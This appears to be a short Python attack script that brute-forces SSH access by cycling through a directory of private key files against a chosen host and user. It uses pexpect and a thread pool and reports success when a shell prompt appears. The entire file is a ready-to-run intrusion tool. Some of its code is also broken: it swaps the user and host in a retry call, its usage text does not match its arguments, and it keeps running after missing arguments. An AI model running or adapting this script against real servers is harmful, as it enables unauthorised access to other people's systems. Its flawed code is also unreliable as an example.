#!/usr/bin/python
# author: axi0m
# purpose: ssh key bruteforce - uses pexpect
# usage: sshBruteKey.py --host 10.10.10.10 --user root -F keys.txt
# example: sshBruteKey.py


'''
To Do:
'''

import pexpect
import argparse
import os
from threading import Thread, BoundedSemaphore

maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)
Stop = False
Fails = 0


def connect(host, user, keyfile, release):
    global Stop
    global Fails
    try:
        perm_denied = 'Permission denied'
        ssh_newkey = 'Are you sure you want to continue'
        conn_closed = 'Connection closed by remote host'
        opt = ' -o PasswordAuthentication=no'
        connStr = 'ssh ' + user + \
                '@' + host + ' -i' + keyfile + opt
        child = pexpect.spawn(connStr)
        ret = child.expect([pexpect.TIMEOUT, perm_denied, \
                ssh_newkey, conn_closed, '$', '#', ])
        if ret == 2:
            print('[-] Adding host to ~/.ssh/known_hosts')
            child.sendline('yes')
            connect(user, host, keyfile, False)
        elif ret == 3:
            print('[-] Connection closed by remote host')
            Fails += 1
        elif ret > 3:
            print('[+] Success. ' + str(keyfile))
            Stop = True
    finally:
        if release:
            connection_lock.release()


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--host',nargs='?', action="store", dest="host", help="The host to target for scanning.")
    parser.add_argument('--user',nargs='?', action="store", dest="user", help="The username to brute-force.")
    parser.add_argument('--dir',nargs='?', action="store", dest="directory", help="The ssh private key to reference.")

    args = parser.parse_args()

    host = args.host
    directory = args.directory
    user = args.user

    if host is None or directory is None or user is None:
        parser.print_help()

    for filename in os.listdir(directory):
        if Stop:
            print(f'[*] Exiting: Key Found.')
            exit(0)
        if Fails > 5:
            print(f'[!] Exiting: Too Many Connections Closed by Remote Host.')
            print(f'[!] Adjust number of simultaneous threads.')
            exit(0)
        connection_lock.acquire()
        fullpath = os.path.join(directory, filename)
        print(f'[-] Testing keyfile {fullpath}')
        t = Thread(target=connect, args=(user, host, fullpath, True))
        child = t.start()

if __name__ == "__main__":
    main()
